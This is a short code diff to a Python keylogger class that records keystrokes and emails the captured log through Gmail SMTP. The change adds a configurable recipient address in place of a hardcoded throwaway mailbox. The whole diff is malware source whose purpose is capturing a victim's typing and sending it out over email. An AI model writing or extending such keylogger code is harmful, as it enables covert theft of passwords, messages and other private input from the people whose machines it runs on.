@@ -5,11 +5,12 @@ from threading import Timer
 
 class KeyLogger:
 
-    def __init__(self, time_interval, sink="file", email="", password=""):
+    def __init__(self, time_interval, sink="file", email="", password="", to_email=""):
         self.time_interval = time_interval
         self.sink = sink
         self.email = email
         self.password = password
+        self.to_email = to_email
         self.log = ""
         self.sess_st = self.millis()
         self.sess_end = self.millis()
@@ -47,7 +48,7 @@ class KeyLogger:
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
         server.login(self.email, self.password)
-        server.sendmail(self.email, "fiwohid263@sartess.com", message)
+        server.sendmail(self.email, self.to_email, message)
         server.quit()
 
     def generate_filename(self):
